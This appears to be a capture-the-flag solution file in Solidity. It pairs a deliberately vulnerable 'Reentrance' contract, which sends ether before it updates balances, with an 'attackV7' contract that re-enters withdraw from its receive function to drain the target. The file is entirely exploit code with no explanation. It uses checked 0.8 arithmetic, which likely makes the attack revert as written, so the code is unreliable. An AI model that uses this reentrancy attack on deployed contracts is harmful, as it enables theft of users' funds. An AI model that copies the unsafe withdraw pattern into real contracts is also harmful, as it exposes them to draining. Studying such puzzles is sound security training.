// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract attackV7{

    Reentrance  reen;

    constructor(address payable _reen){
        reen = Reentrance(_reen);
    }

    function attack(address to) public payable {
        reen.donate{value: msg.value}(to);
        reen.withdraw(msg.value);
    }

    receive() external payable {
        reen.withdraw(msg.value);
        
    }
}